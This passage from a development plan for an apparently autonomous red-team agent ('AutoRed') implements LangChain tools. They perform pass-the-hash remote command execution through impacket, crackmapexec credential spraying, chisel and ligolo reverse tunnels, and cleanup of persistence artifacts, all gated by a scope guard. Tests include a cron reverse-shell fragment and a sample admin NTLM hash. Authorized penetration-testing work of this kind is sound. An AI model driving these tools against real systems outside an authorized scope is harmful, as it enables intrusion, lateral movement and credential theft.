psexec / smbexec ship alongside it because ``PivotRecord.method``
(spec §9.2) is a Literal across all three.

All three share one command builder and one parser — the impacket
remote-exec family has a uniform CLI (``<tool>.py [-hashes :nthash]
user[:pass]@target command``) and uniform failure markers.
"""
from typing import Literal

from langchain_core.tools import tool
from pydantic import BaseModel

from autored.logging import get_logger
from autored.roe_guard import roe_guard
from autored.subprocess_runner import SubprocessResult, run_subprocess
from autored.tools.nmap import _save_raw

log = get_logger("tools.impacket_remote")


class ImpacketRemoteResult(BaseModel):
    """Result of one remote command via an impacket remote-exec channel."""

    host_ip: str
    method: Literal["wmiexec", "psexec", "smbexec"]
    command_executed: str
    output: str
    success: bool
    raw_output_path: str = ""
    duration_sec: float = 0.0


def _build_impacket_cmd(
    tool_name: str,
    username: str,
    password: str,
    nthash: str,
    target: str,
    command: str,
) -> list[str]:
    """Build ``<tool>.py`` argv for wmiexec/psexec/smbexec.

    With an NTLM hash, impacket expects ``-hashes :<nthash>`` and a
    bare ``user@target`` (pass-the-hash). With a password it expects
    ``user:password@target``. Never mixes the two.
    """
    cmd = [f"{tool_name}.py"]
    if nthash:
        cmd += ["-hashes", f":{nthash}", f"{username}@{target}"]
    else:
        cmd += [f"{username}:{password}@{target}"]
    cmd += [command]
    return cmd


def _parse_impacket_output(
    result: SubprocessResult,
    host_ip: str,
    method: str,
    command: str,
    raw_path: str,
) -> ImpacketRemoteResult:
    """Parse an impacket remote-exec subprocess result.

    Failure markers: nonzero returncode, ``STATUS_LOGON_FAILURE``,
    ``SessionError``, or a leading ``[-]`` error line in stderr — the
    impacket family's uniform failure surface.
    """
    text = result.stdout + result.stderr
    failed = (
        result.returncode != 0
        or "STATUS_LOGON_FAILURE" in text
        or "SessionError" in text
        or "[-]" in result.stderr
    )
    return ImpacketRemoteResult(
        host_ip=host_ip,
        method=method,
        command_executed=command,
        output=result.stdout,
        success=not failed,
        raw_output_path=raw_path,
        duration_sec=result.duration_sec,
    )


async def _run_impacket_remote(
    tool_name: str,
    username: str,
    password: str,
    nthash: str,
    target: str,
    command: str,
    engagement_id: str,
) -> ImpacketRemoteResult:
    """Shared body for the three @tool entrypoints."""
    cmd = _build_impacket_cmd(tool_name, username, password, nthash, target, command)
    log.info(
        "impacket_remote", tool=tool_name, target=target,
        auth="nthash" if nthash else "password",
    )
    result = await run_subprocess(cmd, timeout=300)
    raw_path = await _save_raw(tool_name, target, result.stdout, result.stderr, engagement_id)
    return _parse_impacket_output(result, target, tool_name, command, raw_path)


@tool
@roe_guard(allowed_categories=["lateral"])
async def impacket_wmiexec(
    username: str,
    password: str,
    nthash: str,
    target: str,
    command: str,
    engagement_id: str = "",
) -> ImpacketRemoteResult:
    """Run a command on a Windows target via impacket wmiexec (WMI over DCOM).

    Args:
        username: Account to authenticate as.
        password: Plaintext password (empty when using a hash).
        nthash: NTLM hash for pass-the-hash (empty when using a password).
        target: Target IP (must be within the engagement's allowed_ips).
        command: Remote command to execute (e.g. "whoami").
        engagement_id: Current engagement ID.

    Returns:
        ImpacketRemoteResult — ``success`` False on logon failure /
        session errors.
    """
    return await _run_impacket_remote(
        "wmiexec", username, password, nthash, target, command, engagement_id,
    )


@tool
@roe_guard(allowed_categories=["lateral"])
async def impacket_psexec(
    username: str,
    password: str,
    nthash: str,
    target: str,
    command: str,
    engagement_id: str = "",
) -> ImpacketRemoteResult:
    """Run a command on a Windows target via impacket psexec (RemComSvc over SMB)."""
    return await _run_impacket_remote(
        "psexec", username, password, nthash, target, command, engagement_id,
    )


@tool
@roe_guard(allowed_categories=["lateral"])
async def impacket_smbexec(
    username: str,
    password: str,
    nthash: str,
    target: str,
    command: str,
    engagement_id: str = "",
) -> ImpacketRemoteResult:
    """Run a command on a Windows target via impacket smbexec (SMBExec / svcexec)."""
    return await _run_impacket_remote(
        "smbexec", username, password, nthash, target, command, engagement_id,
    )
```

- [ ] **Step 5: Export from `autored/tools/__init__.py`**

Append (matching the existing export style):

```python
from autored.tools.impacket_remote import (
    impacket_wmiexec,
    impacket_psexec,
    impacket_smbexec,
    ImpacketRemoteResult,
)
```

and add the four names to `__all__`.

- [ ] **Step 6: Run tests to verify they pass**

Run: `uv run pytest tests/unit/tools/test_impacket_remote.py -v` → 8 PASS.
Run full suite `uv run pytest -q` → **253 passed, 4 skipped**.

- [ ] **Step 7: Commit**

```bash
git add autored/tools/impacket_remote.py autored/tools/__init__.py tests/unit/tools/test_impacket_remote.py tests/fixtures/impacket_wmiexec_output.txt tests/fixtures/impacket_wmiexec_failure.txt
git commit -m "feat: add impacket wmiexec/psexec/smbexec lateral movement tools"
```

---

## Task 3: crackmapexec Tool (Credential Validation Spray)

**Files:**
- Create: `autored/tools/crackmapexec.py`
- Modify: `autored/tools/__init__.py`
- Test: `tests/unit/tools/test_crackmapexec.py`
- Fixture: `tests/fixtures/crackmapexec_goad.txt`

**Interfaces:**
- Consumes: `run_subprocess`, `_save_raw`, `roe_guard` (same as Task 2).
- Produces:
  - `CrackmapexecResult(host_ip: str, protocol: str, username: str, success: bool, pwned: bool, output: str, raw_output_path: str, duration_sec: float)` — consumed by Task 6 (PivotExecutor step 1: credential validation).
  - `@tool crackmapexec(protocol: str, target: str, username: str, password: str, nthash: str, engagement_id: str) -> CrackmapexecResult`.
  - `_build_cme_cmd(protocol, target, username, password, nthash) -> list[str]`, `_parse_cme_output(result, host_ip, protocol, username, raw_path) -> CrackmapexecResult`.

- [ ] **Step 1: Write the fixture**

```text
# tests/fixtures/crackmapexec_goad.txt
SMB         192.168.56.22     445    SRV02           [*] Windows 10 / Server 2019 Build 17763 (name:SRV02) (domain:NORTH.SOUTH.LOCAL) (signing:False) (SMBv1:False)
SMB         192.168.56.22     445    SRV02           [+] NORTH.SOUTH.LOCAL\administrator:31d6cfe0d16ae931b73c59d7e0c089c0 (Pwn3d!)
```

- [ ] **Step 2: Write the failing tests**

```python
# tests/unit/tools/test_crackmapexec.py
"""Unit tests for the crackmapexec tool wrapper (Phase 5 Task 3)."""
from pathlib import Path

from autored.subprocess_runner import SubprocessResult
from autored.tools.crackmapexec import (
    CrackmapexecResult,
    _build_cme_cmd,
    _parse_cme_output,
)

FIXTURES = Path(__file__).parents[2] / "tests" / "fixtures"


def _sub(text: str, returncode: int = 0) -> SubprocessResult:
    return SubprocessResult(
        stdout=text, stderr="", returncode=returncode,
        duration_sec=2.0, command="crackmapexec",
    )


def test_build_cmd_with_hash():
    cmd = _build_cme_cmd(
        "smb", "192.168.56.22", "administrator",
        password="", nthash="31d6cfe0d16ae931b73c59d7e0c089c0",
    )
    assert cmd[:3] == ["crackmapexec", "smb", "192.168.56.22"]
    assert "-u" in cmd and "administrator" in cmd
    assert "-H" in cmd and "31d6cfe0d16ae931b73c59d7e0c089c0" in cmd
    assert "-p" not in cmd


def test_build_cmd_with_password():
    cmd = _build_cme_cmd("smb", "10.0.0.2", "bob", password="pw", nthash="")
    assert "-p" in cmd and "pw" in cmd
    assert "-H" not in cmd


def test_parse_pwned_output():
    text = (FIXTURES / "crackmapexec_goad.txt").read_text()
    res = _parse_cme_output(_sub(text), "192.168.56.22", "smb", "administrator", "")
    assert res.success is True
    assert res.pwned is True
    assert res.username == "administrator"


def test_parse_logon_failure():
    text = (
        "SMB         10.0.0.2     445    HOST  [-] NORTH\\bob:bad "
        "(STATUS_LOGON_FAILURE)"
    )
    res = _parse_cme_output(_sub(text), "10.0.0.2", "smb", "bob", "")
    assert res.success is False
    assert res.pwned is False


def test_parse_auth_ok_not_admin():
    # [+] auth but no (Pwn3d!) → cred works, but no admin
    text = "SMB         10.0.0.2     445    HOST  [+] NORTH\\bob:pw"
    res = _parse_cme_output(_sub(text), "10.0.0.2", "smb", "bob", "")
    assert res.success is True
    assert res.pwned is False


def test_parse_nonzero_returncode_is_failure():
    res = _parse_cme_output(_sub("anything", returncode=1), "10.0.0.2", "smb", "u", "")
    assert res.success is False


def test_result_model_defaults():
    r = CrackmapexecResult(
        host_ip="h", protocol="smb", username="u",
        success=True, pwned=True, output="o",
    )
    assert r.raw_output_path == ""
    assert r.duration_sec == 0.0
```

- [ ] **Step 3: Run tests to verify they fail**

Run: `uv run pytest tests/unit/tools/test_crackmapexec.py -v`
Expected: FAIL with `ModuleNotFoundError: No module named 'autored.tools.crackmapexec'`

- [ ] **Step 4: Write `autored/tools/crackmapexec.py`**

```python
"""crackmapexec tool wrapper (Phase 5).

Spec §5.3: ``crackmapexec {protocol} {target} -u {users} -H {hashes}``.
Used by the PivotExecutor sub-agent as the credential-validation spray
before opening an impacket remote-exec channel: a hash or password
that fails CME auth will fail wmiexec too, so CME is the cheap probe.

The modern binary is sometimes shipped as ``nxc``/``netexec``, but the
spec pins ``crackmapexec`` and Kali still aliases it — keep the spec
name; operators with only ``netexec`` installed can symlink it.
"""
import re

from langchain_core.tools import tool
from pydantic import BaseModel

from autored.logging import get_logger
from autored.roe_guard import roe_guard
from autored.subprocess_runner import SubprocessResult, run_subprocess
from autored.tools.nmap import _save_raw

log = get_logger("tools.crackmapexec")


class CrackmapexecResult(BaseModel):
    """Result of one crackmapexec credential spray."""

    host_ip: str
    protocol: str
    username: str
    success: bool      # authentication succeeded
    pwned: bool        # admin-level access (the "Pwn3d!" marker)
    output: str
    raw_output_path: str = ""
    duration_sec: float = 0.0


_PWNED_RE = re.compile(r"Pwn3d!")


def _build_cme_cmd(
    protocol: str,
    target: str,
    username: str,
    password: str,
    nthash: str,
) -> list[str]:
    """Build the crackmapexec argv (hash auth and password auth are
    mutually exclusive — hash wins when both are supplied, mirroring
    the pass-the-hash priority in the impacket builder)."""
    cmd = ["crackmapexec", protocol, target, "-u", username]
    if nthash:
        cmd += ["-H", nthash]
    elif password:
        cmd += ["-p", password]
    return cmd


def _parse_cme_output(
    result: SubprocessResult,
    host_ip: str,
    protocol: str,
    username: str,
    raw_path: str,
) -> CrackmapexecResult:
    """Parse crackmapexec output.

    ``Pwn3d!`` → authenticated with admin rights. A bare ``[+]`` line
    without ``Pwn3d!`` → authenticated as a regular user.
    ``STATUS_LOGON_FAILURE`` or nonzero returncode → auth failed.
    """
    text = result.stdout + result.stderr
    pwned = bool(_PWNED_RE.search(text))
    auth_ok = "[+]" in text and "STATUS_LOGON_FAILURE" not in text
    success = (pwned or auth_ok) and result.returncode == 0
    return CrackmapexecResult(
        host_ip=host_ip,
        protocol=protocol,
        username=username,
        success=success,
        pwned=pwned,
        output=result.stdout,
        raw_output_path=raw_path,
        duration_sec=result.duration_sec,
    )


@tool
@roe_guard(allowed_categories=["lateral"])
async def crackmapexec(
    protocol: str,
    target: str,
    username: str,
    password: str = "",
    nthash: str = "",
    engagement_id: str = "",
) -> CrackmapexecResult:
    """Validate credentials against a target via crackmapexec.

    Args:
        protocol: One of "smb", "winrm", "ssh", "ldap", "mssql".
        target: Target IP (must be within the engagement's allowed_ips).
        username: Account to spray.
        password: Plaintext password (empty when using a hash).
        nthash: NTLM hash for pass-the-hash (empty when using a password).
        engagement_id: Current engagement ID.

    Returns:
        CrackmapexecResult — ``success`` is authentication success;
        ``pwned`` is True only for admin-level access.
    """
    cmd = _build_cme_cmd(protocol, target, username, password, nthash)
    log.info("crackmapexec", protocol=protocol, target=target, user=username)
    result = await run_subprocess(cmd, timeout=180)
    raw_path = await _save_raw(
        "crackmapexec", target, result.stdout, result.stderr, engagement_id,
    )
    return _parse_cme_output(result, target, protocol, username, raw_path)
```

- [ ] **Step 5: Export from `autored/tools/__init__.py`**

```python
from autored.tools.crackmapexec import crackmapexec, CrackmapexecResult
```

(add both names to `__all__`).

- [ ] **Step 6: Run tests to verify they pass**

Run: `uv run pytest tests/unit/tools/test_crackmapexec.py -v` → 7 PASS.
Run full suite `uv run pytest -q` → **260 passed, 4 skipped**.

- [ ] **Step 7: Commit**

```bash
git add autored/tools/crackmapexec.py autored/tools/__init__.py tests/unit/tools/test_crackmapexec.py tests/fixtures/crackmapexec_goad.txt
git commit -m "feat: add crackmapexec credential validation tool"
```

---

## Task 4: Tunnel Tools (ligolo / chisel)

**Files:**
- Create: `autored/tools/tunnel.py`
- Modify: `autored/tools/__init__.py`
- Test: `tests/unit/tools/test_tunnel.py`

**Interfaces:**
- Consumes: `roe_guard`, `TunnelConfig` from `autored.models.lateral` (Task 1).
- Produces:
  - `TunnelResult(command_built: str, tunnel_config: TunnelConfig, success: bool, raw_output_path: str)` — consumed by Task 7 (TunnelSetup sub-agent).
  - `@tool ligolo_connect(proxy_ip: str, proxy_port: int, engagement_id: str) -> TunnelResult` — the endpoint param is named `proxy_ip` so the RoE Guard's generic IP-scope check (extended in Task 1) applies to the tunnel endpoint.
  - `@tool chisel_reverse(lhost: str, lport: int, target_network: str, engagement_id: str) -> TunnelResult`.
  - `_build_ligolo_cmd(proxy_ip, proxy_port) -> list[str]`, `_build_chisel_cmd(lhost, lport) -> list[str]`.
  - Both tools record a `TunnelConfig` **with a working `teardown_command`** (the Cleanup Agent runs it verbatim).

Design note — ligolo and chisel are *interactive/long-running* tunnel clients. Same contract as Phase 4's foothold-shell tools: the command is built, saved as raw evidence, and the config recorded; the actual long-running process bring-up is operator-supervised / Phase 6 session-manager territory. The tunnel's *teardown* is fully functional today (`pkill -f ...` runs locally).

- [ ] **Step 1: Write the failing tests**

```python
# tests/unit/tools/test_tunnel.py
"""Unit tests for tunnel tools (Phase 5 Task 4)."""
from autored.tools.tunnel import (
    TunnelResult,
    _build_chisel_cmd,
    _build_ligolo_cmd,
    _config_from_chisel,
    _config_from_ligolo,
)


def test_build_ligolo_cmd():
    cmd = _build_ligolo_cmd("10.10.14.5", 11601)
    assert cmd[0] == "ligolo-ng"
    assert "--connect" in cmd
    assert "10.10.14.5:11601" in cmd


def test_build_chisel_cmd():
    cmd = _build_chisel_cmd("10.10.14.5", 1080)
    assert cmd[:2] == ["chisel", "client"]
    assert "10.10.14.5:1080" in cmd
    assert "R:socks" in cmd  # reverse SOCKS pivot


def test_ligolo_config_records_teardown():
    cfg = _config_from_ligolo("10.10.14.5", 11601)
    assert cfg.tool == "ligolo"
    assert cfg.proxy_endpoint == "10.10.14.5:11601"
    assert cfg.local_port == 11601
    assert cfg.teardown_command == "pkill -f ligolo-ng"


def test_chisel_config_records_teardown():
    cfg = _config_from_chisel("10.10.14.5", 1080, "192.168.56.0/24")
    assert cfg.tool == "chisel"
    assert cfg.target_network == "192.168.56.0/24"
    assert "10.10.14.5:1080" in cfg.teardown_command
    assert cfg.teardown_command.startswith("pkill -f")


def test_tunnel_result_model():
    cfg = _config_from_ligolo("10.10.14.5", 11601)
    r = TunnelResult(command_built="ligolo-ng --connect x", tunnel_config=cfg)
    assert r.success is True
    assert r.raw_output_path == ""
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `uv run pytest tests/unit/tools/test_tunnel.py -v`
Expected: FAIL with `ModuleNotFoundError: No module named 'autored.tools.tunnel'`

- [ ] **Step 3: Write `autored/tools/tunnel.py`**

```python
"""Tunnel tools: ligolo-ng and chisel (Phase 5, spec §5.3).

Both are long-running interactive clients, so — like Phase 4's
foothold-shell tools — the AutoRed side builds the command, saves it
as raw evidence, and records a :class:`TunnelConfig` carrying a
**working teardown command** (the Cleanup Agent runs it verbatim).
The actual long-running process bring-up is operator-supervised /
Phase 6 session-manager territory; teardown is functional today
(``pkill`` runs locally).

``ligolo_connect`` names its endpoint argument ``proxy_ip`` so the
RoE Guard's generic IP-scope check (extended in Task 1 to honour
``proxy_ip``) applies to the tunnel endpoint.
"""
import os

from langchain_core.tools import tool
from pydantic import BaseModel

from autored.logging import get_logger
from autored.models.lateral import TunnelConfig
from autored.roe_guard import roe_guard
from autored.tools.nmap import _save_raw

log = get_logger("tools.tunnel")


class TunnelResult(BaseModel):
    """Result of a tunnel bring-up (command + recorded config)."""

    command_built: str
    tunnel_config: TunnelConfig
    success: bool = True
    raw_output_path: str = ""


def _autored_lhost() -> str:
    """AutoRed host IP tunnels point back at (AUTORED_LHOST override)."""
    return os.environ.get("AUTORED_LHOST", "127.0.0.1")


def _build_ligolo_cmd(proxy_ip: str, proxy_port: int) -> list[str]:
    """Build the ligolo-ng client argv."""
    return [
        "ligolo-ng", "--connect", f"{proxy_ip}:{proxy_port}", "--ignore-cert",
    ]


def _build_chisel_cmd(lhost: str, lport: int) -> list[str]:
    """Build the chisel client argv (reverse SOCKS pivot)."""
    return ["chisel", "client", f"{lhost}:{lport}", "R:socks"]


def _config_from_ligolo(proxy_ip: str, proxy_port: int) -> TunnelConfig:
    return TunnelConfig(
        tool="ligolo",
        proxy_endpoint=f"{proxy_ip}:{proxy_port}",
        local_port=proxy_port,
        target_network="0.0.0.0/0",
        teardown_command="pkill -f ligolo-ng",
    )


def _config_from_chisel(lhost: str, lport: int, target_network: str) -> TunnelConfig:
    return TunnelConfig(
        tool="chisel",
        proxy_endpoint=f"{lhost}:{lport}",
        local_port=lport,
        target_network=target_network,
        teardown_command=f"pkill -f 'chisel client {lhost}:{lport}'",
    )


@tool
@roe_guard(allowed_categories=["tunnel"])
async def ligolo_connect(
    proxy_ip: str,
    proxy_port: int = 11601,
    engagement_id: str = "",
) -> TunnelResult:
    """Bring up a ligolo-ng tunnel to a proxy endpoint.

    Args:
        proxy_ip: Ligolo proxy IP (scope-checked by the RoE Guard).
        proxy_port: Ligolo proxy port (default 11601).
        engagement_id: Current engagement ID.

    Returns:
        TunnelResult with the recorded TunnelConfig (incl. teardown).
    """
    cmd = _build_ligolo_cmd(proxy_ip, proxy_port)
    cfg = _config_from_ligolo(proxy_ip, proxy_port)
    log.info("ligolo_connect", endpoint=cfg.proxy_endpoint)
    raw_path = await _save_raw(
        "ligolo", proxy_ip, " ".join(cmd), "", engagement_id,
    )
    return TunnelResult(
        command_built=" ".join(cmd), tunnel_config=cfg, raw_output_path=raw_path,
    )


@tool
@roe_guard(allowed_categories=["tunnel"])
async def chisel_reverse(
    lhost: str = "",
    lport: int = 1080,
    target_network: str = "0.0.0.0/0",
    engagement_id: str = "",
) -> TunnelResult:
    """Bring up a chisel reverse SOCKS tunnel to the AutoRed host.

    Args:
        lhost: AutoRed host IP the tunnel calls back to (defaults to
            the ``AUTORED_LHOST`` env var).
        lport: Local SOCKS port (default 1080).
        target_network: CIDR reachable through the tunnel.
        engagement_id: Current engagement ID.

    Returns:
        TunnelResult with the recorded TunnelConfig (incl. teardown).
    """
    host = lhost or _autored_lhost()
    cmd = _build_chisel_cmd(host, lport)
    cfg = _config_from_chisel(host, lport, target_network)
    log.info("chisel_reverse", endpoint=cfg.proxy_endpoint)
    raw_path = await _save_raw(
        "chisel", host, " ".join(cmd), "", engagement_id,
    )
    return TunnelResult(
        command_built=" ".join(cmd), tunnel_config=cfg, raw_output_path=raw_path,
    )
```

- [ ] **Step 4: Export from `autored/tools/__init__.py`**

```python
from autored.tools.tunnel import (
    ligolo_connect,
    chisel_reverse,
    TunnelResult,
)
```

(add the three names to `__all__`).

- [ ] **Step 5: Run tests to verify they pass**

Run: `uv run pytest tests/unit/tools/test_tunnel.py -v` → 5 PASS.
Run full suite `uv run pytest -q` → **265 passed, 4 skipped**.

- [ ] **Step 6: Commit**

```bash
git add autored/tools/tunnel.py autored/tools/__init__.py tests/unit/tools/test_tunnel.py
git commit -m "feat: add ligolo and chisel tunnel tools with teardown tracking"
```

---

## Task 5: Cleanup Tools (cleanup_execute + cleanup_verify)

**Files:**
- Create: `autored/tools/cleanup.py`
- Modify: `autored/tools/__init__.py`
- Test: `tests/unit/tools/test_cleanup_tools.py`

**Interfaces:**
- Consumes: `_build_impacket_cmd` from `autored.tools.impacket_remote` (Task 2); `PersistenceArtifact.details` key conventions from Phase 4 Task 6 (`task_name` for scheduled_task, `key_path`+`value_name` for registry_run, `schedule`+`command` for cron, `service_name` for systemd, `comment` for ssh_authorized_keys).
- Produces:
  - `CleanupExecutionResult(host_ip: str, removal_command: str, transport: Literal["impacket_wmiexec","ssh"], success: bool, output: str, error: str | None, raw_output_path: str, duration_sec: float)` — consumed by Task 8 (ArtifactRemover).
  - `CleanupVerificationResult(host_ip: str, verify_command: str, transport: str, verified: bool, output: str, raw_output_path: str)` — consumed by Task 9 (VerificationScanner).
  - `@tool cleanup_execute(host_ip, removal_command, transport, username, password, nthash, engagement_id) -> CleanupExecutionResult`.
  - `@tool cleanup_verify(host_ip, verify_command, method, transport, username, password, nthash, engagement_id) -> CleanupVerificationResult`.
  - `_build_remote_cmd(transport, host_ip, username, password, nthash, command) -> list[str]` — wraps a shell command in wmiexec (Windows) or sshpass+ssh (Linux) transport.
  - `_build_verify_command(method: str, details: dict) -> str` — per-artifact-method absence check command.
  - `_artifact_absent(method: str, text: str, returncode: int) -> bool` — the absence parser.

Key semantics: "verified" means the re-scan output proves the artifact is **gone** (Windows "cannot find" / "unable to find" markers, or a grep-style nonzero exit). A failed removal must never be marked verified (Review Focus #5).

- [ ] **Step 1: Write the failing tests**

```python
# tests/unit/tools/test_cleanup_tools.py
"""Unit tests for cleanup tools (Phase 5 Task 5)."""
from autored.subprocess_runner import SubprocessResult
from autored.tools.cleanup import (
    _artifact_absent,
    _build_remote_cmd,
    _build_verify_command,
)


def _sub(text: str, returncode: int = 0) -> SubprocessResult:
    return SubprocessResult(
        stdout=text, stderr="", returncode=returncode,
        duration_sec=1.0, command="cleanup",
    )


def test_build_remote_cmd_wmiexec_transport():
    cmd = _build_remote_cmd(
        "impacket_wmiexec", "10.0.0.2", "administrator", "", "abc123",
        "schtasks /delete /tn AutoRedUpdate /f",
    )
    assert cmd[0] == "wmiexec.py"
    assert "-hashes" in cmd
    assert "administrator@10.0.0.2" in cmd
    assert cmd[-1].startswith("schtasks /delete")


def test_build_remote_cmd_ssh_transport():
    cmd = _build_remote_cmd(
        "ssh", "10.0.0.3", "root", "pw", "", "crontab -r",
    )
    assert cmd[:2] == ["sshpass", "-p"]
    assert "root@10.0.0.3" in cmd
    assert cmd[-1] == "crontab -r"


def test_build_verify_command_scheduled_task():
    cmd = _build_verify_command(
        "scheduled_task", {"task_name": "AutoRedUpdate"},
    )
    assert "schtasks /query" in cmd
    assert "AutoRedUpdate" in cmd


def test_build_verify_command_registry_run():
    cmd = _build_verify_command(
        "registry_run", {"key_path": "HKCU\\...\\Run", "value_name": "AutoRed"},
    )
    assert "reg query" in cmd
    assert "AutoRed" in cmd


def test_build_verify_command_cron():
    cmd = _build_verify_command("cron", {"command": "bash -i"})
    assert "crontab -l" in cmd
    assert "bash -i" in cmd


def test_build_verify_command_unknown_method_falls_back():
    cmd = _build_verify_command("wmi_subscription", {})
    assert cmd  # non-empty fallback, never crashes


def test_artifact_absent_windows_not_found_marker():
    text = "ERROR: The system cannot find the file specified."
    assert _artifact_absent("scheduled_task", text, 1) is True


def test_artifact_absent_registry_marker():
    text = "The system was unable to find the specified registry key or value."
    assert _artifact_absent("registry_run", text, 1) is True


def test_artifact_absent_still_present():
    text = "TaskName: AutoRedUpdate  Next Run: tomorrow"
    assert _artifact_absent("scheduled_task", text, 0) is False


def test_artifact_absent_grep_style_nonzero_exit():
    # grep-based verify (cron/systemd/ssh keys): rc 1 = no match = gone
    assert _artifact_absent("cron", "", 1) is True
    assert _artifact_absent("cron", "bash -i >& ...", 0) is False
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `uv run pytest tests/unit/tools/test_cleanup_tools.py -v`
Expected: FAIL with `ModuleNotFoundError: No module named 'autored.tools.cleanup'`

- [ ] **Step 3: Write `autored/tools/cleanup.py`**

```python
"""Cleanup tools: execute + verify artifact removal (Phase 5, spec §6.6).

The Cleanup Agent's sub-agents (ArtifactRemover, VerificationScanner)
use these two tools. Removal commands come verbatim from each
``PersistenceArtifact.removal_command`` (recorded at creation time in
Phase 4) and are transported to the host via impacket-wmiexec
(Windows) or sshpass+ssh (Linux) — the same remote-exec channels the
Lateral Agent uses, so cleanup is fully functional given credentials.

"Verified" means the re-scan output **proves absence**: Windows
not-found markers, or a grep-style nonzero exit. A failed removal is
never marked verified (Review Focus #5).
"""
from typing import Literal

from langchain_core.tools import tool
from pydantic import BaseModel

from autored.logging import get_logger
from autored.roe_guard import roe_guard
from autored.subprocess_runner import SubprocessResult, run_subprocess
from autored.tools.impacket_remote import _build_impacket_cmd
from autored.tools.nmap import _save_raw

log = get_logger("tools.cleanup")


class CleanupExecutionResult(BaseModel):
    """Outcome of executing one removal command on a host."""

    host_ip: str
    removal_command: str
    transport: Literal["impacket_wmiexec", "ssh"]
    success: bool
    output: str
    error: str | None = None
    raw_output_path: str = ""
    duration_sec: float = 0.0


class CleanupVerificationResult(BaseModel):
    """Outcome of one absence re-scan."""

    host_ip: str
    verify_command: str
    transport: Literal["impacket_wmiexec", "ssh"]
    verified: bool
    output: str
    raw_output_path: str = ""


def _build_remote_cmd(
    transport: str,
    host_ip: str,
    username: str,
    password: str,
    nthash: str,
    command: str,
) -> list[str]:
    """Wrap a shell command in a remote transport.

    ``impacket_wmiexec`` → wmiexec.py (Windows targets, supports
    pass-the-hash). ``ssh`` → sshpass + ssh (Linux targets).
    """
    if transport == "ssh":
        return [
            "sshpass", "-p", password,
            "ssh", "-o", "StrictHostKeyChecking=no",
            f"{username}@{host_ip}", command,
        ]
    return _build_impacket_cmd(
        "wmiexec", username, password, nthash, host_ip, command,
    )


# Absence markers per artifact method: the re-scan output containing
# one of these (or a grep-style nonzero exit) proves the artifact is
# gone. Windows markers are matched case-insensitively for safety.
_ABSENCE_MARKERS: dict[str, list[str]] = {
    "scheduled_task": [
        "cannot find the file specified",
        "the system cannot find the file",
        "error: the system cannot find",
    ],
    "registry_run": [
        "unable to find the specified registry key or value",
        "the system was unable to find",
        "cannot find the file specified",
    ],
    "service": [
        "could not find the service",
        "failed to find",
    ],
    # grep-based methods (cron, systemd, ssh_authorized_keys) rely on
    # nonzero exit / empty output rather than error text.
}


def _build_verify_command(method: str, details: dict) -> str:
    """Build the per-method absence-check command for an artifact."""
    if method == "scheduled_task":
        return f'schtasks /query /tn "{details.get("task_name", "")}"'
    if method == "registry_run":
        return (
            f'reg query "{details.get("key_path", "")}" '
            f'/v {details.get("value_name", "")}'
        )
    if method == "cron":
        return f'crontab -l | grep -F "{details.get("command", "")}"'
    if method == "systemd":
        return f'systemctl status {details.get("service_name", "")} || true'
    if method == "ssh_authorized_keys":
        return f'grep -c "{details.get("comment", "autored")}" ~/.ssh/authorized_keys'
    # Unknown / future methods: generic "did the command channel work"
    # probe — never crashes, never silently verifies.
    return "echo autored-verify-probe"


def _artifact_absent(method: str, text: str, returncode: int) -> bool:
    """Decide whether the re-scan output proves the artifact is gone.

    Windows marker methods: absent when a not-found marker appears.
    grep-style methods: absent when the exit code is nonzero (no
    match) or output is empty. Anything still echo-ing artifact
    content (returncode 0 with content) → present.
    """
    lowered = text.lower()
    markers = _ABSENCE_MARKERS.get(method)
    if markers:
        return any(m in lowered for m in markers)
    # grep-style absence: no match (rc != 0) or empty output
    return returncode != 0 or not text.strip()


async def _run_remote(
    cmd: list[str], engagement_id: str, host_ip: str, tool_name: str,
) -> tuple[SubprocessResult, str]:
    result = await run_subprocess(cmd, timeout=180)
    raw_path = await _save_raw(
        tool_name, host_ip, result.stdout, result.stderr, engagement_id,
    )
    return result, raw_path


@tool
@roe_guard(allowed_categories=["cleanup"])
async def cleanup_execute(
    host_ip: str,
    removal_command: str,
    transport: str = "impacket_wmiexec",
    username: str = "",
    password: str = "",
    nthash: str = "",
    engagement_id: str = "",
) -> CleanupExecutionResult:
    """Execute one artifact removal command on a host.

    Args:
        host_ip: Host with the artifact (must have engagement creds).
        removal_command: Verbatim from PersistenceArtifact.removal_command.
        transport: "impacket_wmiexec" (Windows) or "ssh" (Linux).
        username: Account to authenticate as.
        password: Plaintext password (empty when using a hash).
        nthash: NTLM hash for pass-the-hash.
        engagement_id: Current engagement ID.

    Returns:
        CleanupExecutionResult — ``success`` False on transport / auth
        failure; the error text is preserved.
    """
    cmd = _build_remote_cmd(
        transport, host_ip, username, password, nthash, removal_command,
    )
    log.info("cleanup_execute", host_ip=host_ip, transport=transport)
    result, raw_path = await _run_remote(cmd, engagement_id, host_ip, "cleanup_execute")
    text = result.stdout + result.stderr
    failed = (
        result.returncode != 0
        or "STATUS_LOGON_FAILURE" in text
        or "SessionError" in text
    )
    return CleanupExecutionResult(
        host_ip=host_ip,
        removal_command=removal_command,
        transport=transport,
        success=not failed,
        output=result.stdout,
        error=result.stderr or None if failed else None,
        raw_output_path=raw_path,
        duration_sec=result.duration_sec,
    )


@tool
@roe_guard(allowed_categories=["cleanup"])
async def cleanup_verify(
    host_ip: str,
    verify_command: str,
    method: str,
    transport: str = "impacket_wmiexec",
    username: str = "",
    password: str = "",
    nthash: str = "",
    engagement_id: str = "",
) -> CleanupVerificationResult:
    """Re-scan a host to verify an artifact was removed.

    Args:
        host_ip: Host to re-scan.
        verify_command: From ``_build_verify_command(method, details)``.
        method: The PersistenceArtifact method (drives absence parsing).
        transport: "impacket_wmiexec" (Windows) or "ssh" (Linux).
        username / password / nthash: Engagement credentials for the host.
        engagement_id: Current engagement ID.

    Returns:
        CleanupVerificationResult — ``verified`` is True only when the
        re-scan output proves absence.
    """
    cmd = _build_remote_cmd(
        transport, host_ip, username, password, nthash, verify_command,
    )
    log.info("cleanup_verify", host_ip=host_ip, method=method)
    result, raw_path = await _run_remote(cmd, engagement_id, host_ip, "cleanup_verify")
    text = result.stdout + result.stderr
    verified = _artifact_absent(method, text, result.returncode)
    return CleanupVerificationResult(
        host_ip=host_ip,
        verify_command=verify_command,
        transport=transport,
        verified=verified,
        output=text,
        raw_output_path=raw_path,
    )
```

- [ ] **Step 4: Export from `autored/tools/__init__.py`**

```python
from autored.tools.cleanup import (
    cleanup_execute,
    cleanup_verify,
    CleanupExecutionResult,
    CleanupVerificationResult,
)
```

(add the four names to `__all__`).
